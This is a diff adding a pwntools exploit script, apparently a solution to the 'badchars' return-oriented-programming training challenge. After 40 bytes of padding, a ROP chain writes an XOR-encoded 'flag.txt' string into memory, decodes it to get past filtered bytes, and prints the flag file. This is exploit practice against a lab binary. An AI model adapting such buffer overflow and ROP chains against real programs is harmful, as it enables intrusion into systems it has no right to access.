@@ -1,0 +1,37 @@
+from pwn import *
+
+p = process('./badchars')
+
+ret =0x00000000004004ee # ret
+gad1 = 0x00000000004006a3 # pop rdi ; ret
+gad2 = 0x00000000004006a0 # pop r14 ; pop r15 ; ret
+gad3 = 0x0000000000400628 # xor byte ptr [r15], r14b ; ret
+gad4 = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret
+gad5 = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+PRINT = 0x400510
+data = 0x601038
+xor_byte = 0xf
+flag = 0x7b777b21686e6369 #flag.txt
+
+payload =b'A'*40
+payload += p64(gad5)
+payload += p64(flag)
+payload += p64(data)
+payload += p64(xor_byte)
+payload += p64(xor_byte)
+payload += p64(gad4)
+
+
+for i in range(8):
+	payload += p64(gad2)
+	payload += p64(xor_byte)
+	payload += p64(data + i)
+	payload += p64(gad3)
+
+payload += p64(gad1)
+payload += p64(data)
+payload += p64(PRINT)
+
+p.sendline(payload)
+print(p.recvall())
+
